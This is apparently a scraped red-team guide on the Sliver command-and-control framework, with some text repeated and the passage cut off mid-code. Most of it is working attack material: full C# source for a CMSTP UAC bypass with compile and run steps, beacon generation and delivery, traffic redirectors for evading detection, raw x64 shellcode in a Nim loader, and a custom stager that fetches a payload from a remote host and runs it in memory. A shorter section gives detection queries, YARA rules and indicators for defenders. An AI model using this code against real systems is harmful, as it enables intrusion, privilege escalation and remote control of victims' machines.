https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1 Code author: Andre Marques (@_zc00l) */ using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Windows; using System.Runtime.InteropServices; public class CMSTPBypass { // Our .INF file data! public static string InfData = @\"[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install REPLACE_COMMAND_LINE taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \"\"HKLM\"\", \"\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\"\", \"\"ProfileInstallPath\"\", \"\"%UnexpectedError%\"\", \"\"\"\" [Strings] ServiceName=\"\"CorpVPN\"\" ShortSvcName=\"\"CorpVPN\"\" \"; [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); public static string BinaryPath = \"c:\\\\windows\\\\system32\\\\cmstp.exe\"; /* Generates a random named .inf file with command to be executed with UAC privileges */ public static string SetInfFile(string CommandToExecute) { string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(\".\"))[0]; string TemporaryDir = \"C:\\\\windows\\\\temp\"; StringBuilder OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir); OutputFile.Append(\"\\\\\"); OutputFile.Append(RandomFileName); OutputFile.Append(\".inf\"); StringBuilder newInfData = new StringBuilder(InfData); newInfData.Replace(\"REPLACE_COMMAND_LINE\", CommandToExecute); File.WriteAllText(OutputFile.ToString(), newInfData.ToString()); return OutputFile.ToString(); } public static bool Execute(string CommandToExecute) { if(!File.Exists(BinaryPath)) { Console.WriteLine(\"Could not find cmstp.exe binary!\"); return false; } StringBuilder InfFile = new StringBuilder(); InfFile.Append(SetInfFile(CommandToExecute)); Console.WriteLine(\"Payload file written to \" + InfFile.ToString()); ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath); startInfo.Arguments = \"/au \" + InfFile.ToString(); startInfo.UseShellExecute = false; Process.Start(startInfo); IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero; do { windowHandle = SetWindowActive(\"cmstp\"); } while (windowHandle == IntPtr.Zero); System.Windows.Forms.SendKeys.SendWait(\"{ENTER}\"); return true; } public static IntPtr SetWindowActive(string ProcessName) { Process[] target = Process.GetProcessesByName(ProcessName); if(target.Length == 0) return IntPtr.Zero; target[0].Refresh(); IntPtr WindowHandle = new IntPtr(); WindowHandle = target[0].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return IntPtr.Zero; SetForegroundWindow(WindowHandle); ShowWindow(WindowHandle, 5); return WindowHandle; } } Compile the code to .dll with the following command: Add-Type -TypeDefinition ([IO.File]::ReadAllText(\"$pwd\\Source.cs\")) -ReferencedAssemblies \"System.Windows.Forms\" -OutputAssembly \"CMSTP-UAC-Bypass.dll\" Read the class in the CMSTP-UAC-Bypass.dll file to the variable: [Reflection.Assembly]::Load([IO.File]::ReadAllBytes(\"$pwd\\CMSTP-UAC-Bypass.dll\")) The class will then be accessible and can be used within the script. The Execute method is used to run the Sliver beacon and write a payload file into the temp directory. [CMSTPBypass]::Execute(\"C:\\to\\beacon\\location\\caddy_beacon.exe\") This will initialise a high integrity cmd.exe popup on the target machine. The command getsystem can now be used in Sliver to start a new system session. The command beacon displays active beacons. The system account is selected with the use [PID] command. For blue teams Threat hunting A multilayered approach to security is required to safeguard operation security. This should include the use of endpoint detection and response (EDR) tools, network traffic analysis, and file system monitoring. Lateral movement Remote process execution It is not always feasible to fingerprint the command-and-control (C2) communication protocol due to SSL encryption. Detecting lateral movement attempts is relatively easier, however. This can be illustrated with the psexec method of process execution. The attacker copies an executable (1), initiates the CreateServiceW request (2), and starts the service with the StartServiceW call (3). This method is widely used to gain unauthorized access to remote systems. During such operations the remote service name, service description, and the executable's upload location can be customized. Sliver additionally generates a random file name for each psexec execution. In this case it is hygienicu6.exe . The process does not appear in the main window of Task Manager. It is instead found under the Details tab. It can also be viewed in Procmon. Administrative shares may need to be enabled in order to execute processes remotely. In some cases this requires modification of the registry. This is achieved with the following command: reg add HKLM\\SYSTEM\\CurrentControlSet\\Services\\lanmanserver\\parameters /f /v AutoShareWks /t REG_DWORD /d 1 . Default values for the ImagePath, DisplayName, and Description of the service installed on the remote system when using Sliver\u2019s PsExec command can be queried with the following command: | where ActionType == 'RegistryValueSet' | where (RegistryValueName == 'ImagePath' and RegistryValueData matches regex @'^[a-zA-Z]:\\\\windows\\\\temp\\\\[a-zA-Z0-9]{10}\\.exe') or (RegistryValueName == 'DisplayName' and RegistryValueData == 'Sliver') or (RegistryValueName == 'Description' and RegistryValueData == 'Sliver implant') When building a robust detection signature of a lateral movement technique it is important to rely on a sequence of events that don\u2019t change, rather than detecting specific strings or binary sequences in the network traffic (e.g., the default service name \u201cSliver\u201d, or the default target directory \u201cWindows\\Temp\u201d). Network Traffic Analysis It is also possible to identify certain patterns and signatures associated with Sliver. Sliver's unique encryption algorithm can be detected through network traffic monitoring. Sliver use DNS, mTLs, WireGuard and HTTP(S) for callback protocols. All traffic is encrypted. Additional encoding can be used for further obfuscation. Lateral movement from Sliver is reasonably easy to detect in Wireshark. DNS traffic is of particular relevance to blue teams. The Sliver implant encodes its messages into subdomain requests and responses. The data is packaged and encoded in such a way as to maximize the amount of data sent in any single request. Encoded and encrypted payload data is limited to 254 characters per subdomain. There is a limited character count per request. C2 servers using DNS generate traffic significant orders of magnitude higher than protocols such as HTTP. This makes DNS logs a logical place to look for Sliver traces. This can be achieved by looking for subdomains with an excessive domain count or a large number of bytes per request. Monitoring Yara Specific IP addresses, domain names, and ports used by C2 traffic can also be monitored. Daniel Roberson's Yara rule is an example of a useful tool in this context. rule sliver_client : c2 implant { meta: description = \"Bishop Fox's Sliver C2 Implant\" author = \"Daniel Roberson\" url = \"https://github.com/BishopFox/sliver\" strings: $s1 = \"github.com/bishopfox/sliver/client\" condition: all of them and filesize < 50MB } rule sliver_server : c2 { meta: description = \"Bishop Fox's Sliver C2 Server\" author = \"Daniel Roberson\" url = \"https://github.com/BishopFox/sliver\" strings: $s1 = \"RunSliver\" condition: all of them and filesize > 50MB } File System Monitoring This method involves monitoring the file system for executable files associated with Sliver and its Indicators of Compromise (IoCs). Organizations can detect the presence of Sliver C2 by monitoring these files and tracking changes to critical system files like the Windows registry. https://bazaar.abuse.ch/browse/signature/Sliver/ provides an updated list of IoCs to aid in this process. First seen SHA256 2023-01-05 19:38:07 3221de492e436a79655b4a82b72830a28de3aa417300fdf06e0b28202053ff3e 2023-01-05 19:37:00 1846c1db07d4f9a3a86605e38c0be5da38074b91cfafa1a72bccc693b06346e4 2022-12-16 19:20:46 f63993a7e4dc3e4242509482ca4d9ee1cbd4c00d219503ecf5d139d763a42f35 2022-07-18 08:00:49 78eb647f3d2aae5c52fcdc46ac1b27fb5a388ad39abbe614c0cfc902d223ccd6 2022-07-18 08:00:44 f13deec28f6f6d3f4f555f5a2db48cd8a541be52c331ccfccba929e4dfd6bc7a 2022-07-18 08:00:39 fa647a34b88c5409a58d2f2568147fa03112eb8bfa34bccd801830446213d7c4 2022-07-18 08:00:32 5568131f894caf1217f4cbda3dd40c1f39e680ce7727ed4a767cd1986e7805f0 2022-07-18 08:00:26 5c973707940097122ec97fcb73e7b14f054c11c7e1dd958efe933ae3c6a78c4e Endpoint Detection and Response (EDR) Tools EDR tools are specifically designed to identify and respond to threats on endpoints. They can detect Sliver activity by observing specific behaviors. This includes the execution of malicious files or the establishment of particular network connections. Network indicators provided by https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221 are potentially useful resources in this regard. Indicator Type 43[.]128.62.42 IPv4 45[.]144.3.216 IPv4 hxxp://43.128.62.42/acl.exe URL hxxp://45.144.3.216/powercat.ps1 URL 5[.]199.173.103 IPv4 61[.]155.8.2 IPv4 hxxp://43.128.62.42:8888 URL hxxp://45.144.3.216/2.ps1 URL hxxp://45.144.3.216:14356 URL hxxp://5.199.173.103/7za.exe URL hxxp://5.199.173.103/syse.bat URL hxxp://5.199.173.103/t.zip URL Limitations Sliver supports various other methods to move laterally using third-party components. Modules can be installed using the armory command. Sliver's alias and extension package manager can install components such as SharpWMI, allow remote process creation via WMI, ServiceMove-BOF, abuse the Windows Perception Simulation Service, and SCShell. These rely on ChangeServiceConfigA to run commands. All these methods require tailored detections because the techniques employed greatly differ. Sources AlienVault. (n.d.). AlienVault Open Threat Exchange. AlienVault . Retrieved June 13, 2023, from https://otx.alienvault.com/pulse/63e5d72a7086a248b9fac221 BishopFox. (n.d.). Sliver: Adversary Emulation Framework. GitHub . Retrieved May 17, 2023, from https://github.com/BishopFox/sliver Breen, K. (2023). Detecting and decrypting Sliver C2 \u2013 a threat hunter\u2019s guide. Immersive Labs . Retrieved June 13, 2023, from https://www.immersivelabs.com/blog/detecting-and-decrypting-sliver-c2-a-threat-hunters-guide/ Cybereason (n.d.). Sliver C2 Leveraged by Many Threat Actors. Cybereason . Retrieved June 12, 2023, from https://www.cybereason.com/blog/sliver-c2-leveraged-by-many-threat-actors Seamless Intelligence. (n.d). Domain User to Domain Admin using Sliver. Seamless Intelligence . Retrieved May 17, 2023, from https://seamlessintelligence.com.au/sliver_2.html Marques, Z. (2018, October 31). How to bypass UAC in newer Windows versions. zc00l blog . Retrieved May 17, 2023, from https://0x00-0x00.github.io/research/2018/10/31/How-to-bypass-UAC-in-newer-Windows-versions.html Microsoft (2023). Looking for the \u2018Sliver\u2019 lining: Hunting for emerging command-and-control frameworks. Microsoft Security Blog . Retrieved June 13, 2023, from https://www.microsoft.com/en-us/security/blog/2022/08/24/looking-for-the-sliver-lining-hunting-for-emerging-command-and-control-frameworks/ Numen. (2023). Looking for the \u2018Sliver\u2019 lining - Getting System Shell with Sliver C2. Numen . Retrieved May 17, 2023, from https://www.numencyber.com/looking-for-the-sliver-lining/ Roberson, D. (2021, December 31). 100 Days of YARA \u2013 Day 36: Sliver Adversary Emulation Framework. DMFR SECURITY . Retrieved June 13, 2023, from https://dmfrsecurity.com/2022/01/24/100-days-of-yara-day-36-sliver-adversary-emulation-framework/","title":"Sliver"},{"location":"5-local-privilege-escalation/sliver/sliver/#sliver","text":"","title":"Sliver"},{"location":"5-local-privilege-escalation/sliver/sliver/#background","text":"Sliver is an open-source adversary emulation/red team framework and is an alternative to Cobalt Strike. The tool can be utilized by organizations of any scale for conducting post-exploitation security testing. Sliver's implants have built-in support for communication channels such as mutual TLS (mTLS), WireGuard, HTTP(S), and DNS. They are compiled on the fly using unique encryption keys for each binary. Server and client components of Sliver are compatible with MacOS, Windows, and Linux operating systems. They also function with other Golang compiler targets, although testing is in this case not comprehensive. The tool is undetected in the FireEye EDR.","title":"Background"},{"location":"5-local-privilege-escalation/sliver/sliver/#features","text":"The tool includes a wide range of features. A notable feature is the 'multipayer' mode, which allows multiple operators to connect to the same server beacon. This is especially useful in large-scale red-teaming environments where coordination is necessary. Operators and server connections are authenticated using mTLS. Certificates are managed automaticaly by Sliver. It is fully scriptable with Java/Typescript. See the Sliver Github for a more detailed breakdown.","title":"Features"},{"location":"5-local-privilege-escalation/sliver/sliver/#installation","text":"The installation process is straightforward. The most reliable method is to download the latest server and client binaries from the Sliver release page. Begin by changing user rights with chmod +x sliver* and run the server file by entering the following: ./sliver-server","title":"Installation"},{"location":"5-local-privilege-escalation/sliver/sliver/#server-and-client-setup","text":"Set up a server in the /tmp directory with the command python3 -m http.server 8000 . Create a new operator profile. ./sliver-server_linux operator --name [OPERATOR] --lhost [IP ADDRESS] --save [OPERATOR].cfg This feature is useful because it allows multiple operators to connect to the same server. The .cfg file is placed in /root by default. Import the profile into relevant folder using the ./sliver-client_linux import [OPERATOR].cfg command. Additional operators are created on the server. Profiles can be exported to the player with SCP. The command scp [OPERATOR].cfg kali@[ADDRESS]: is used. Operators import the profile using the command import [OPERATOR].cfg . Enable Multiplayer mode on the server with the command multiplayer . Operators can be viewed by entering the operator command. Operators enter enter the game when they run the client server.","title":"Server and client setup"},{"location":"5-local-privilege-escalation/sliver/sliver/#beacon-setup","text":"Generate beacons on the Sliver server with the following command: generate beacon --mtls [IP ADDRESS] --save /tmp/[BEACON NAME] --skip-symbols -f exe --os windows Implant the beacon on the target machine. The most convenent implantation method is to set up a browser-accessible server. As before, this can be done in the /tmp directory with the command python3 -m http.server [PORT NUMBER] . Port 8080 was used in this example. For Windows-based targets it is recommended to use the .exe extension when naming the beacon. Save and run the beacon file from the local drive. Initialise an mTLS session on the server. Addtional arguments were used in the example below, but the session will also start simply by using the mtls command. The implant beacon will appear in the session once the beacon file on the target machine has been executed locally (i.e., double-clicked). Implants are viewable with the implants command. The command interactive can be used to select the current C2 channel. Alternativey, the command use can be deployed to select the session from a list. Once the session is selected it is possible to navigate the target machine's file system. The session will persist until the beacon is removed. It is accessible via both the server and the client. The help keyword displays the possible range of commands.","title":"Beacon setup"},{"location":"5-local-privilege-escalation/sliver/sliver/#usage","text":"","title":"Usage"},{"location":"5-local-privilege-escalation/sliver/sliver/#1-modules","text":"Sliver modules offer a wide range of attack vectors and can be accessed with the armory command. Armory modules can be installed with the armory install [MODULE NAME] command. Usage instructions can be accessed with the [MODULE NAME] -h command.","title":"1. Modules"},{"location":"5-local-privilege-escalation/sliver/sliver/#2-advanced-usage","text":"","title":"2 Advanced Usage"},{"location":"5-local-privilege-escalation/sliver/sliver/#21-traffic-redirection","text":"Command and control (C2) infrastructure is used to communicate with compromised systems and maintain control over them. C2 traffic redirection enables attackers to control C2 traffic within the target environment. Traffic redirectors help attackers evade detection and bypass security controls designed to detect or block malicious C2 traffic. They enable attackers to obfuscate their activities and make it harder for security systems to identify and block their actions. Setting up a traffic redirector in Silver requires the installation of a dedicated server. This can be done with Apache or NGINX, but the process is simplest in Caddy.","title":"2.1 Traffic redirection"},{"location":"5-local-privilege-escalation/sliver/sliver/#caddy","text":"","title":"Caddy"},{"location":"5-local-privilege-escalation/sliver/sliver/#installation_1","text":"On Debian-based systems Caddy can be installed with the following commands: sudo apt install -y debian-keyring debian-archive-keyring apt-transport-https curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/gpg.key' | sudo gpg --dearmor -o /usr/share/keyrings/caddy-stable-archive-keyring.gpg curl -1sLf 'https://dl.cloudsmith.io/public/caddy/stable/debian.deb.txt' | sudo tee /etc/apt/sources.list.d/caddy-stable.list sudo apt update sudo apt install caddy","title":"Installation"},{"location":"5-local-privilege-escalation/sliver/sliver/#server-setup","text":"Caddy configuration is handled by the Caddyfile located in /etc/caddy . The file requires only two modifications. The topmost domain is the site targeted for redirection. The domain following the redir command is the destination URL and port to where requests will be redirected. The {uri} placeholder preserves the original path and query parameters in the redirect. mTLS requests in Sliver are sent over port 8888. The redirect port should be set to this number when using Sliver's mTLS listener. The port number for the target domain should be unique. The caddy server is started by issuing the caddy start command. The standard Sliver beacon setup procedure can be used once the Caddy server is up and running: Generate beacon: generate beacon --mtls 198.18.103.67 --save /tmp/caddy_beacon.exe --skip-symbols -f exe --os windows Start mTLS listener: mtls Set up a server accessible on the target machine: python3 -m http.server [UNIQUE PORT NUMBER] Navigate to the server page in the bowser on the target machine. In this example, the page is located at 198.18.107.63:8081 . Implant the beacon on the target machine by downloading and executing the file generated in step 1. The beacon is displayed in the Sliver UI after the beacon file has been executed. Select beacon with the command use . The session can be upgraded with the interactive command. The command beacons displays the available beacons. Active beacons are displayed in green. The reverse proxy is set up correctly if the beacon calls back to the back to the server at given intervals. Inactive beacons are displayed in red. In Nestat:","title":"Server setup"},{"location":"5-local-privilege-escalation/sliver/sliver/#22-staging","text":"Sliver payloads can be large. As such, a stager can be used to execute an implant on a target. A stager is a small program or script that fetches the main payload from a remote location. While size doesn't matter as much in computing world anymore, hiding a full-sized implant can be difficult in certain circumstances. Sliver can generate stagers or a custom one can be used. The following is needed to set up a stager in Sliver: A staging server (Your sliver server) A stage 2 payload (the main sliver payload, typically in shellcode) The stager (Can be generated with the generate stager command or custom-made)","title":"2.2 Staging"},{"location":"5-local-privilege-escalation/sliver/sliver/#stager-setup","text":"Sliver staging uses the profiles feature. Profiles work as implant blueprints that define configuration information. Profiles can be created with profiles new command. In this example, we will serve an mTLS implant. sliver > profiles new --mtls 198.18.103.68 --format shellcode win-shellcode [*] Saved new implant profile win-shellcode sliver > profiles Profile Name Implant Type Platform Command & Control Debug Format Obfuscation Limitations =============== ============== =============== =============================== ======= =========== ============= ============= win-shellcode session windows/amd64 [1] mtls://198.18.103.68:8888 false SHELLCODE enabled sliver > With the profile setup, a listener for the mTLS implant is required. sliver > mtls [*] Starting mTLS listener ... [*] Successfully started job #1 sliver > jobs ID Name Protocol Port ==== ====== ========== ====== 1 mtls tcp 8888 A staging listener can then be created with the stage-listener command and linked to a new profile: sliver > stage-listener --url http://198.18.103.68:80 --profile win-shellcode [*] No builds found for profile win-shellcode, generating a new one [*] Job 1 (tcp) started sliver > jobs ID Name Protocol Port == ==== ======== ==== 1 http tcp 80 2 mtls tcp 8888 Now we're ready to create our stager. This can be done with the generate stager command. A local host and port should be specified to know where the stage listener is. sliver > generate stager --lhost 198.18.103.68 --lport 80 --protocol http --save /tmp [*] Sliver stager saved to: /tmp/NEAT_SNOWPLOW If this results in an RPC error it is likely that Sliver's payload generator is out of date. The error can be resolved by updating Kali with the commands sudo apt update , followed by sudo apt upgrade . With the stager generated, we can take a look at the results: \u250c\u2500\u2500(kali\u327fkali-vle)-[~] \u2514\u2500$ cat /tmp/NEAT_SNOWPLOW unsigned char buf[] = \"\\xfc\\x48\\x83\\xe4\\xf0\\xe8\\xcc\\x00\\x00\\x00\\x41\\x51\\x41\\x50\\x52\" \"\\x48\\x31\\xd2\\x65\\x48\\x8b\\x52\\x60\\x48\\x8b\\x52\\x18\\x48\\x8b\\x52\" ... \"\\xc2\\x48\\xff\\xc0\\x48\\x89\\xc1\\x41\\xba\\xea\\x0f\\xdf\\xe0\\xff\\xd5\" Sliver as of now won't generate anything that can just be double-clicked. Something to run shellcode needs to be built. This can be accomplished in a near infinite amount of ways. One method is demonstrated below.","title":"Stager setup"},{"location":"5-local-privilege-escalation/sliver/sliver/#creating-the-stager","text":"Nim can be used to create the stager. Nim is a statically typed compiled programming language that resembles Python and compiles to C, C++ and even JavaScript. This method uses Nim's Winim library that allows easy access Windows API definitions. It can be installed it with the command nimble install winim import winim/lean when defined(windows): var shellcode: array[511, byte] = [ byte 0xfc,0x48,0x83,0xe4,0xf0,0xe8,0xcc,0x00,0x00,0x00,0x41,0x51,0x41,0x50,0x52 ,0x48,0x31,0xd2,0x65,0x48,0x8b,0x52,0x60,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52 ,0x20,0x51,0x56,0x48,0x0f,0xb7,0x4a,0x4a,0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9 ,0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,0xc9,0x0d,0x41 ,0x01,0xc1,0xe2,0xed,0x52,0x41,0x51,0x48,0x8b,0x52,0x20,0x8b,0x42,0x3c,0x48 ,0x01,0xd0,0x66,0x81,0x78,0x18,0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b ,0x80,0x88,0x00,0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x8b,0x48 ,0x18,0x44,0x8b,0x40,0x20,0x49,0x01,0xd0,0x50,0xe3,0x56,0x48,0xff,0xc9,0x41 ,0x8b,0x34,0x88,0x48,0x01,0xd6,0x4d,0x31,0xc9,0x48,0x31,0xc0,0x41,0xc1,0xc9 ,0x0d,0xac,0x41,0x01,0xc1,0x38,0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45 ,0x39,0xd1,0x75,0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b ,0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,0x88,0x41,0x58 ,0x48,0x01,0xd0,0x41,0x58,0x5e,0x59,0x5a,0x41,0x58,0x41,0x59,0x41,0x5a,0x48 ,0x83,0xec,0x20,0x41,0x52,0xff,0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9 ,0x4b,0xff,0xff,0xff,0x5d,0x49,0xbe,0x77,0x73,0x32,0x5f,0x33,0x32,0x00,0x00 ,0x41,0x56,0x49,0x89,0xe6,0x48,0x81,0xec,0xa0,0x01,0x00,0x00,0x49,0x89,0xe5 ,0x49,0xbc,0x02,0x00,0x1e,0x61,0xc6,0x12,0x67,0x44,0x41,0x54,0x49,0x89,0xe4 ,0x4c,0x89,0xf1,0x41,0xba,0x4c,0x77,0x26,0x07,0xff,0xd5,0x4c,0x89,0xea,0x68 ,0x01,0x01,0x00,0x00,0x59,0x41,0xba,0x29,0x80,0x6b,0x00,0xff,0xd5,0x6a,0x0a ,0x41,0x5e,0x50,0x50,0x4d,0x31,0xc9,0x4d,0x31,0xc0,0x48,0xff,0xc0,0x48,0x89 ,0xc2,0x48,0xff,0xc0,0x48,0x89,0xc1,0x41,0xba,0xea,0x0f,0xdf,0xe0,0xff,0xd5 ,0x48,0x89,0xc7,0x6a,0x10,0x41,0x58,0x4c,0x89,0xe2,0x48,0x89,0xf9,0x41,0xba ,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0x49,0xff,0xce,0x75,0xe5 ,0xe8,0x93,0x00,0x00,0x00,0x48,0x83,0xec,0x10,0x48,0x89,0xe2,0x4d,0x31,0xc9 ,0x6a,0x04,0x41,0x58,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8,0x5f,0xff,0xd5 ,0x83,0xf8,0x00,0x7e,0x55,0x48,0x83,0xc4,0x20,0x5e,0x89,0xf6,0x6a,0x40,0x41 ,0x59,0x68,0x00,0x10,0x00,0x00,0x41,0x58,0x48,0x89,0xf2,0x48,0x31,0xc9,0x41 ,0xba,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x48,0x89,0xc3,0x49,0x89,0xc7,0x4d,0x31 ,0xc9,0x49,0x89,0xf0,0x48,0x89,0xda,0x48,0x89,0xf9,0x41,0xba,0x02,0xd9,0xc8 ,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7d,0x28,0x58,0x41,0x57,0x59,0x68,0x00,0x40 ,0x00,0x00,0x41,0x58,0x6a,0x00,0x5a,0x41,0xba,0x0b,0x2f,0x0f,0x30,0xff,0xd5 ,0x57,0x59,0x41,0xba,0x75,0x6e,0x4d,0x61,0xff,0xd5,0x49,0xff,0xce,0xe9,0x3c ,0xff,0xff,0xff,0x48,0x01,0xc3,0x48,0x29,0xc6,0x48,0x85,0xf6,0x75,0xb4,0x41 ,0xff,0xe7,0x58,0x6a,0x00,0x59,0xbb,0xe0,0x1d,0x2a,0x0a,0x41,0x89,0xda,0xff ,0xd5 ] # Equilevant to Python's if __name__ == \"__main__\" when isMainModule: let currentproc = GetCurrentProcessId() echo \"Current process ID: \", currentproc # Allocate memory for our shellcode let memPtr = VirtualAlloc( nil, cast[SIZE_T](shellcode.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) # Copy our shellcode to the memory section CopyMemory(memPtr, unsafeAddr shellcode, cast[SIZE_T](shellcode.len)) # Interesting way to execute our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs EnumSystemGeoID( 16, 0, cast[GEO_ENUMPROC](memPtr) ) Compiling this program can be done on Linux if you have MinGW . The command to compile it to Windows is nim c --cpu:amd64 --os:windows --gcc.exe:x86_64-w64-mingw32-gcc --gcc.linkerexe:x86_64-w64-mingw32-gcc -d:release <your stager>.nim Running this binary on the target Windows machine results in the binary fetching the main Sliver payload from our server and executing it, giving us a session: Confirming the stager fetched the main payload can be done by viewing sliver.log file:","title":"Creating the stager"},{"location":"5-local-privilege-escalation/sliver/sliver/#custom-stager-creation","text":"Since the effort was made to create a binary to run the generated stager, why not go all the way and create a custom stager? This is easier than it sounds. Sliver has documentation on how to make your own stager on their Github page. All we have to do is to fetch the payload being served on the Sliver server through the stage-listener . Viewing the Sliver C2 documentation , we see the Sliver serves the main payloads on the HTTP protocol when requesting any file with the .woff file extension. This can be tested by using something like wget on the sliver server and requesting a file such as googlewebfront.woff \u250c\u2500\u2500(kali\u327fkali-vle)-[~/nim/malzDev/Sliver-stage-0] \u2514\u2500$ wget localhost:80/googlewebfront.woff \u250c\u2500\u2500(kali\u327fkali-vle)-[~/nim/malzDev/Sliver-stage-0] \u2514\u2500$ cat googlewebfront.woff| xxd | head -n 3 00000000: 3879 2f42 3f45 2847 2b4b 6250 6553 6841 8y/B?E(G+KbPeShA 00000010: 848d 2a78 ce77 153b eaff aca8 d27a 0e69 ..*x.w.;.....z.i 00000020: 2887 67c6 f0f0 f8d8 477d 8639 e58e 1d0c (.g.....G}.9.... The stage listener returned the shellcode in the HTTP response. Now a simple client can be created that fetches the shellcode over HTTP(S) and executes it in memory: import std/httpclient import winim/lean import sequtils when defined(windows): proc main(): void = let currentproc = GetCurrentProcessId() echo \"[*] Current process ID: \", currentproc var client = newHttpClient() var response = client.getContent(\"http://198.18.103.68/googlewebfront.woff\") # Convert the downloaded implant from string to array var bytes = response.toSeq() # Allocate memory let memPtr = VirtualAlloc( nil, cast[SIZE_T](bytes.len), MEM_COMMIT, PAGE_EXECUTE_READ_WRITE ) # Copy our shellcode to the memory section echo \"[*] Copying shellcode to memory...\" CopyMemory(memPtr, addr(bytes[0]), cast[SIZE_T](bytes.len)) echo \"[*] Executing shellcode...\" # Interesting way to exec our code, ref: https://github.com/HuskyHacks/RustyProcessInjectors/blob/master/EnumSystemGeoID/src/main.rs EnumSystemGeoID( 16, 0, cast[GEO_ENUMPROC](memPtr) ) when isMainModule: main() Compiling this program and running it on a Windows target results in us getting the shell:","title":"Custom stager creation"},{"location":"5-local-privilege-escalation/sliver/sliver/#23-privilege-escalation","text":"It is possible to create system sessions in Sliver. On Windows machines it is necessary to bypass User Account Control (UAC) before a remote system session can be initialised. A relatively straightforward way to achieve this is with a reflective DLL injection. On the target machine do the following: Create a script called Sources.cs with the code below. Save it to a convenient location. /* UAC Bypass using CMSTP.exe microsoft binary Based on previous work from Oddvar Moe https://oddvar.moe/2017/08/15/research-on-cmstp-exe/ And this PowerShell script of Tyler Applebaum https://gist.githubusercontent.com/tylerapplebaum/ae8cb38ed8314518d95b2e32a6f0d3f1/raw/3127ba7453a6f6d294cd422386cae1a5a2791d71/UACBypassCMSTP.ps1 Code author: Andre Marques (@_zc00l) */ using System; using System.Text; using System.IO; using System.Diagnostics; using System.ComponentModel; using System.Windows; using System.Runtime.InteropServices; public class CMSTPBypass { // Our .INF file data! public static string InfData = @\"[version] Signature=$chicago$ AdvancedINF=2.5 [DefaultInstall] CustomDestination=CustInstDestSectionAllUsers RunPreSetupCommands=RunPreSetupCommandsSection [RunPreSetupCommandsSection] ; Commands Here will be run Before Setup Begins to install REPLACE_COMMAND_LINE taskkill /IM cmstp.exe /F [CustInstDestSectionAllUsers] 49000,49001=AllUSer_LDIDSection, 7 [AllUSer_LDIDSection] \"\"HKLM\"\", \"\"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\App Paths\\CMMGR32.EXE\"\", \"\"ProfileInstallPath\"\", \"\"%UnexpectedError%\"\", \"\"\"\" [Strings] ServiceName=\"\"CorpVPN\"\" ShortSvcName=\"\"CorpVPN\"\" \"; [DllImport(\"user32.dll\")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow); [DllImport(\"user32.dll\", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd); public static string BinaryPath = \"c:\\\\windows\\\\system32\\\\cmstp.exe\"; /* Generates a random named .inf file with command to be executed with UAC privileges */ public static string SetInfFile(string CommandToExecute) { string RandomFileName = Path.GetRandomFileName().Split(Convert.ToChar(\".\"))[0]; string TemporaryDir = \"C:\\\\windows\\\\temp\"; StringBuilder OutputFile = new StringBuilder(); OutputFile.Append(TemporaryDir); OutputFile.Append(\"\\\\\"); OutputFile.Append(RandomFileName); OutputFile.Append(\".inf\"); StringBuilder newInfData = new StringBuilder(InfData); newInfData.Replace(\"REPLACE_COMMAND_LINE\", CommandToExecute); File.WriteAllText(OutputFile.ToString(), newInfData.ToString()); return OutputFile.ToString(); } public static bool Execute(string CommandToExecute) { if(!File.Exists(BinaryPath)) { Console.WriteLine(\"Could not find cmstp.exe binary!\"); return false; } StringBuilder InfFile = new StringBuilder(); InfFile.Append(SetInfFile(CommandToExecute)); Console.WriteLine(\"Payload file written to \" + InfFile.ToString()); ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath); startInfo.Arguments = \"/au \" + InfFile.ToString(); startInfo.UseShellExecute = false; Process.Start(startInfo); IntPtr windowHandle = new IntPtr(); windowHandle = IntPtr.Zero; do { windowHandle = SetWindowActive(\"cmstp\"); } while (windowHandle == IntPtr.Zero); System.Windows.Forms.SendKeys.SendWait(\"{ENTER}\"); return true; } public static IntPtr SetWindowActive(string ProcessName) { Process[] target = Process.GetProcessesByName(ProcessName); if(target.Length == 0) return IntPtr.Zero; target[0].Refresh(); IntPtr WindowHandle = new IntPtr(); WindowHandle = target[0].MainWindowHandle; if(WindowHandle == IntPtr.Zero) return IntPtr.Zero; 